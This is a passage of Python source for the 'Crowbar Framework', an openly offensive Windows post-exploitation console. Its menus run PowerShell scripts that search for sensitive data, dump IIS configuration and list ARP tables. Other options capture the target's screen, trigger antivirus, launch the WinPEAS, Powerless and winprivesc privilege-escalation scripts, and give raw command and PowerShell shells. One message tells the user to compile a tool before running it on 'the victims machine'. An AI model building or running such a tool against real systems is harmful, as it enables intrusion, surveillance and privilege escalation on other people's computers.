                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptslistinstalledproreg == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptslistinstalledproreg == "clear":
                    os.system("cls")
                elif scriptslistinstalledproreg == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 27":
            while True:
                scriptslistinstalledprofol = input("\nScripts (scripts/powershell/list_installed_programs_using_folders)\n  |==> ")
                if scriptslistinstalledprofol == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif scriptslistinstalledprofol == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptslistinstalledprofol == "clear":
                    os.system("cls")
                elif scriptslistinstalledprofol == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 28":
            while True:
                scriptslistarptables = input("\nScripts (scripts/powershell/list_arp_tables)\n  |==> ")
                if scriptslistarptables == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif scriptslistarptables == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptslistarptables == "clear":
                    os.system("cls")
                elif scriptslistarptables == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 29":
            while True:
                scriptsgetiisconfig = input("\nScripts (scripts/powershell/get_iis_config)\n  |==> ")
                if scriptsgetiisconfig == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif scriptsgetiisconfig == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptsgetiisconfig == "clear":
                    os.system("cls")
                elif scriptsgetiisconfig == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 30":
            while True:
                scriptssensitivedata = input("\nScripts (scripts/powershell/sensitive_data_search)\n  |==> ")
                if scriptssensitivedata == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif scriptssensitivedata == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptssensitivedata == "clear":
                    os.system("cls")
                elif scriptssensitivedata == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        else:
            print("Wrong Command!")


def leaveutil():
    util()

def util():
    while True:
        util = input("\nUtil (util/)\n  |==> ")
        if util == "help":
            print(''' 
            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            | help - Prints out help commands.                                                                                                           |
            | list - Lists all the utilities.                                                                                                            |
            | use (utility number) - Selects and loads specified utility. Example: use 1                                                                 |
            | clear - Clears the screen.                                                                                                                 |
            | back - Goes back to the Crowbar menu.                                                                                                      |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
            ''')
        elif util == "list":
            print(''' 
            +——— Utilities —————————————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
            | 1. util/extra/vmdetect                                                          A utility for VM Detection.                                     |
            | 2. util/nmap [Nmap must be installed on target machine]                         Runs a port scan against the target.                            |
            | 3. util/screencapture                                                           Takes a screenshot of the targets screen.                       |
            | 4. util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
            | 5. util/imonitor                                                                A utility for task monitoring.                                  |
            | 6. util/ipv4                                                                    Grabs IPv4 of target machine.                                   |
            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            ''')
        elif util == "clear":
            os.system("cls")
        elif util == "back":
            os.system("py main.py")
        elif util == "use 1":
            print('''
            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
            | Make sure you compile this into an EXE before                                                                                              |
            | executing on the victims machine! This was made by my friend.                                                                              |
            | Credits to: https://github.com/dehoisted                                                                                                   |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+           
            ''')
        elif util == "use 2":
            while True:
                utilnmap = input("\nUtil (util/nmap)\n  |==> ")
                if utilnmap == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | nmap - Will allow you to port scan the machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Util' directory.                                                                                                  |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif utilnmap == "nmap":
                    utilnmapinput = input("\nUtil (Do you want to do a default scan? y or n)\n  |==> ")
                    if utilnmapinput == "Y" or utilnmapinput == "y":
                        os.system("nmap localhost")
                        print(''' 
                        +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                        | Scan complete!                                                                                                                             |
                        +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                        ''')
                    elif utilnmapinput == "N" or utilnmapinput == "n":
                        utilnmapcustom = input("\nUtil (Type in custom command)\n  |==> ")
                        os.system("{}".format(utilnmapcustom))
                        print(''' 
                        +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                        | Scan complete!                                                                                                                             |
                        +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                        ''')
                elif utilnmap == "back":
                    leaveutil()
                elif utilnmap == "clear":
                    os.system("cls")
                else:
                    print("Wrong Command!")
        elif util == "use 3":
            while True:
                utilss = input("\nUtil (util/screencapture)\n  |==> ")
                if utilss == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | capture - Captures the screen.                                                                                                             |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Util' directory.                                                                                                  |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif utilss == "capture":
                    os.system("py util/screencapture.py")
                elif utilss == "clear":
                    os.system("cls")
                elif utilss == "back":
                    leaveutil()
                else:
                    print("Wrong Command!")
        elif util == "use 4":
            while True:
                utilavtrig = input("\nUtil (util/extra/avtrigger)\n  |==> ")
                if utilavtrig == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           | 
                    | trigger - Triggers the AV.                                                                                                                 |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Util' directory.                                                                                                  |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif utilavtrig == "trigger":
                    os.system("go run util/Avtrigger/main.go")
                    print(''' 
                    +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | AntiVirus triggered!                                                                                                                       |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif utilavtrig == "clear":
                    os.system("cls")
                elif utilavtrig == "back":
                    leaveutil()
        elif util == "use 5":
            while True:
                utilimonitor = input("\nUtil (util/imonitor)\n  |==> ")
                if utilimonitor == "help":
                    print(''' 
                    +——— iMonitor Commands —————————————————————————————————————————————————————————————————— Description ———————————————————————————————————————+
                    | tasklist                                                                                Lists active procceses.                            |
                    | forcekill                                                                               Allows you to forcibly kill tasks.                 |
                    | remotetask                                                                              Allows you to list tasks on a remote computer.     |
                    | stasks                                                                                  Allows you to query tasks you have access to.      |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    
                    +——— Regular Help Commands ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Util' directory.                                                                                                  |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif utilimonitor == "clear":
                    os.system("cls")
                elif utilimonitor == "back":
                    leaveutil()
                elif utilimonitor == "tasklist":
                    os.system("tasklist /svc")
                elif utilimonitor == "forcekill":
                    utilimonpid = input("\nUtil (Enter PID of process you want to kill)\n  |==> ")
                    os.system("taskkill /PID {} /F".format(utilimonpid))
                elif utilimonitor == "remotetask":
                    utilimonremote = input("\nUtil (Enter Name of remote computer)\n  |==> ")
                    os.system("tasklist /V /S {}".format(utilimonremote))
                elif utilimonitor == "stasks":
                    os.system("schtasks")
                else:
                    print("Wrong Command!")
        elif util == "use 6":
            while True:
                utilipv4 = input("\nUtil (util/ipv4)\n  |==> ")
                if utilipv4 == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           | 
                    | ip - Gets the target machines IP address.                                                                                                  |
                    | track - Tracks the target machines IP address.                                                                                             |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Util' directory.                                                                                                  |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
                    ''')
                elif utilipv4 == "ip":
                    print(ipurl)
                elif utilipv4 == "track":
                    print(iptrack)
                elif utilipv4 == "clear":
                    os.system("cls")
                elif utilipv4 == "back":
                    leaveutil()
                else:
                    print("Wrong Command!")
        else:
            print("Wrong Command!")  


def icommand():
    print(''' 
    +——— Help Commands for iCommand —————————————————————————————————————————————————————————————————————————————————————————————————————————————+
    | clear - Clears the screen.                                                                                                                 |
    | back - Goes back to the Crowbar menu.                                                                                                      |
    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
    ''')
    while True:
        icommandin = input("\niCommand (Type the command you want execute)\n  |==> ")
        if icommandin == "clear":
            os.system("cls")
        elif icommandin == "back":
            os.system("py main.py")
        os.system("{}".format(icommandin))

def ipower():
    print(''' 
    +——— Help Commands for iPower ———————————————————————————————————————————————————————————————————————————————————————————————————————————————+
    | clear - Clears the screen.                                                                                                                 |
    | back - Goes back to the Crowbar menu.                                                                                                      |
    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+    
    ''')
    while True:
        ipower = input("\niPower (Type the command you want execute)\n  |==> ")
        if ipower == "clear":
            os.system("cls")
        elif ipower == "back":
            os.system("py main.py")
        os.system("powershell {}".format(ipower))    

# credits to https://github.com/M4ximuss/ for the 'powerless' script
# credits to https://github.com/carlospolop/ for the 'WinPEAS' script
# credits to https://github.com/joshuaruppe/ for the 'winprivesc' script

def leaveescalate():
    escalate()

def escalate():
    while True:
        escalate = input("\nEscalate (escalate/)\n  |==> ")
        if escalate == "help":
            print(''' 
            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            | help - Prints out help commands.                                                                                                           |
            | list - Lists all the utilities.                                                                                                            |
            | use (escalation script number) - Selects and loads specified method. Example: use 1                                                        |
            | clear - Clears the screen.                                                                                                                 |
            | back - Goes back to the Crowbar menu.                                                                                                      |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+             
            ''')
        elif escalate == "list":
            print(''' 
            +——— Escalation Scripts ————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
            | 1. escalate/winpeas                                                             WinPEAS searches for paths to escalate privileges Windows.      |
            | 2. escalate/powerless                                                           A Windows privilege escalation script.                          |
            | 3. escalate/winprivesc                                                          Script for Windows enumeration and privilege escalation routes. |
            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
            ''')
        elif escalate == "clear":
            os.system("cls")
        elif escalate == "back":
            os.system("py main.py")
        elif escalate == "use 1":
            while True:
                escalatewinpeas = input("\nEscalate (escalate/winpeas)\n  |==> ")
                if escalatewinpeas == "help":
                    print('''
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | scan - Starts scanning for paths to escalate privileges.                                                                                   |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Escalate' directory.                                                                                              |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif escalatewinpeas == "scan":
                    os.system("cd escalate && winPEAS.bat")
                    ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
                elif escalatewinpeas == "clear":
                    os.system("cls")
                elif escalatewinpeas == "back":
                    leaveescalate()
                else:
                    print("Wrong Command!")
        elif escalate == "use 2":
            while True:
                escalatepowerless = input("\nEscalate (escalate/powerless)\n  |==> ")
                if escalatepowerless == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | scan - Starts scanning for paths to escalate privileges.                                                                                   |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Escalate' directory.                                                                                              |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif escalatepowerless == "scan":
                    os.system("cd escalate && Powerless.bat")
                elif escalatepowerless == "clear":
                    os.system("cls")
                elif escalatepowerless == "back":
                    leaveescalate()
                else:
                    print("Wrong Command!")
        elif escalate == "use 3":
            while True:
                escalatewinprivesc = input("\nEscalate (escalate/winprivesc)\n  |==> ")
                if escalatewinprivesc == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Loads the script and the menus.                                                                                                      |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - Goes back to the 'Escalate' directory.                                                                                              |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif escalatewinprivesc == "run":
                    os.system("cd escalate && winprivesc.bat")
                elif escalatewinprivesc == "clear":
                    os.system("cls")
                elif escalatewinprivesc == "back":
                    leaveescalate()
                else:
                    print("Wrong Command!")
        else:
            print("Wrong Command!")



def mainmenuinput():
    while True:
        mainmenu = input("\nuser@crowbar:~# ")
        if mainmenu == "help":
            print('''
            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
            | help - Prints out help commands. (This is for the entire framework)                                                                        |
            | dir util - Goes into the 'Util' directory.                                                                                                 |   
            | dir scripts - Goes into the 'Scripts' directory.                                                                                           |
            | dir escalate - Goes into the 'Escalate' directory.                                                                                         |
            | command - Loads the 'iCommand' tool for executing OS commands via CMD.                                                                     |
            | power - Loads the 'iPower' tool for executing OS commands via PowerShell.                                                                  |
            | crowbar - Reloads the framework.                                                                                                           |           
            | clear - Clears the screen. (This is for the entire framework)                                                                              |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            ''')
        elif mainmenu == "dir util":
            util()
        elif mainmenu == "dir scripts":
            scripts()
        elif mainmenu == "dir escalate":
            escalate()
        elif mainmenu == "command":
            icommand()
        elif mainmenu == "power":
            ipower()
        elif mainmenu == "crowbar":
            os.system("py main.py")
        elif mainmenu == "clear":
            os.system("cls")
        else:
            print("Wrong Command!")


print(f''' 
    ▄█▄    █▄▄▄▄ ████▄   ▄ ▄   ███   ██   █▄▄▄▄ 
    █▀ ▀▄  █  ▄▀ █   █  █   █  █  █  █ █  █  ▄▀ 
    █   ▀  █▀▀▌  █   █ █ ▄   █ █ ▀ ▄ █▄▄█ █▀▀▌  
    █▄  ▄▀ █  █  ▀████ █  █  █ █  ▄▀ █  █ █  █  
    ▀███▀    █          █ █ █  ███      █   █   
        ▀            ▀ ▀           █   ▀    
                                  ▀ 

              Welcome {beginmen}
             to the Crowbar Framework.
''')

print(''' 
    +——— Crowbar ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
    | Version: 2.6                                                                                                                             |
    | Scripts: 33                                                                                                                              |
    | Utilities: 6                                                                                                                             |
    | Made by: https://github.com/0x1CA3                                                                                                       |
    |                                                                                                                                          |
    | Total Online Services: 2                                                                                                                 |
    | https://vpnapi.io/api/                                                                                                                   |
    | https://ipv4bot.whatismyipaddress.com/                                                                                                   |
    +——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
''')
mainmenuinput()